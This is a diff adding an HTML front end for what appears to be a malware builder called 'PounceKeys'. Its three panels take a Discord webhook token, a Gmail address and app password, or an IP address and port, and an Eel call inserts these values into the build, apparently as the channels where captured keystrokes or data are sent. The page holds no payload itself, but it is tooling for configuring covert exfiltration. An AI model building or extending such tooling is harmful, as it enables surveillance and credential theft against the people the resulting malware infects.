@@ -1,0 +1,125 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>PounceKeys GUIs</title>
+    <style>
+        body {
+            background-color: #2d2d2d;
+            color: #d8d8d8;
+            font-family: Arial, sans-serif;
+            margin: 0;
+            padding: 0;
+        }
+        .container {
+            display: flex;
+            justify-content: space-around;
+            padding: 20px;
+        }
+        .gui {
+            background-color: #3c3c3c;
+            border-radius: 10px;
+            padding: 20px;
+            width: 30%;
+            margin-right: 20px;
+        }
+        .input-label {
+            color: #a94fd3;
+            margin-bottom: 10px;
+        }
+        .input-field {
+            width: 100%;
+            padding: 8px;
+            border-radius: 5px;
+            border: 1px solid #a94fd3;
+            background-color: #474747;
+            color: #d8d8d8;
+            margin-bottom: 10px;
+        }
+        .message {
+            overflow-y: scroll;
+            max-height: 100px;
+            padding: 10px;
+            background-color: #474747;
+            color: #d8d8d8;
+            border-radius: 5px;
+            margin-bottom: 10px;
+        }
+        .replace-button {
+            background-color: #a94fd3;
+            color: #d8d8d8;
+            border: none;
+            border-radius: 5px;
+            padding: 10px;
+            cursor: pointer;
+            width: 100%;
+        }
+        .replace-button:hover {
+            background-color: #8242a9;
+        }
+    </style>
+</head>
+<body>
+
+<h2>PounceKeys GUIs</h2>
+
+<div class="container">
+    <div class="gui" id="discord">
+        <h3>PounceKeys Discord Builder</h3>
+        <label for="webhook_token" class="input-label">Webhook Bot Token:</label>
+        <input type="text" id="webhook_token" class="input-field">
+        <button class="replace-button" onclick="replaceValues('webhook_token', null, 'discord_message')">Replace Value</button>
+        <div id="discord_message" class="message"></div>
+    </div>
+
+    <div class="gui" id="gmail">
+        <h3>PounceKeys Gmail Builder</h3>
+        <label for="gmail" class="input-label">Gmail:</label>
+        <input type="text" id="gmail" class="input-field">
+        <label for="password" class="input-label">App Password:</label>
+        <input type="password" id="password" class="input-field">
+        <button class="replace-button" onclick="replaceValues('gmail', 'password', 'gmail_message')">Replace Values</button>
+        <div id="gmail_message" class="message"></div>
+    </div>
+
+    <div class="gui" id="ip">
+        <h3>PounceKeys IP Builder</h3>
+        <label for="ip" class="input-label">IP Address:</label>
+        <input type="text" id="ip" class="input-field">
+        <label for="port" class="input-label">Port:</label>
+        <input type="text" id="port" class="input-field">
+        <button class="replace-button" onclick="replaceValues('ip', 'port', 'ip_message')">Replace Values</button>
+        <div id="ip_message" class="message"></div>
+    </div>
+</div>
+
+<!-- Eel JavaScript library -->
+<script src="eel.js"></script>
+
+<!-- Your custom JavaScript -->
+<script>
+    async function replaceValues(input1, input2 = null, messageDivId) {
+        const inputField1 = document.getElementById(input1);
+        const inputField2 = input2 ? document.getElementById(input2) : null;
+        const messageDiv = document.getElementById(messageDivId);
+
+        const inputValue1 = inputField1.value;
+        const inputValue2 = inputField2 ? inputField2.value : null;
+
+        messageDiv.innerHTML = "Replacing values...";
+
+        const response = await eel.replace_values(inputValue1, inputValue2, messageDivId)();
+
+        messageDiv.innerHTML = response;
+    }
+
+    function updateMessage(messageDivId, newMessage) {
+        const messageDiv = document.getElementById(messageDivId);
+        const currentMessage = messageDiv.innerHTML;
+        messageDiv.innerHTML = currentMessage + "<br>" + newMessage;
+    }
+</script>
+
+</body>
+</html>
